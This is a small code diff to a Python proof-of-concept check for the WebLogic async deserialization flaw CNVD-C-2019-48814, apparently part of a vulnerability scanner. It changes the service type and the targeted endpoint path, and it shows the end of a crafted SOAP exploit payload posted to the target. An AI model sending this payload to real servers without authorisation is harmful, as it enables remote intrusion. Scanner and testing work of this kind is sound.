@@ -6,7 +6,7 @@ from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
     def __init__(self, target=None):
-        self.service_type = SERVICE_PORT_MAP.WEB
+        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
         self.name = 'CNVD-C-2019-48814'
         self.keyword = ['weblogic']
         self.info = 'CNVD-C-2019-48814'
@@ -25,7 +25,7 @@ class POC(Script):
     </class></java>
     </work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
             '''
-            url = self.base_url + '_async/AsyncResponseService'
+            url = self.base_url + '_async/AsyncResponseServiceHttps'
             headers = {"Content-Type": "text/xml"}
             try:
                 res = self.curl('post', url, headers=headers, data=poc, timeout=8)
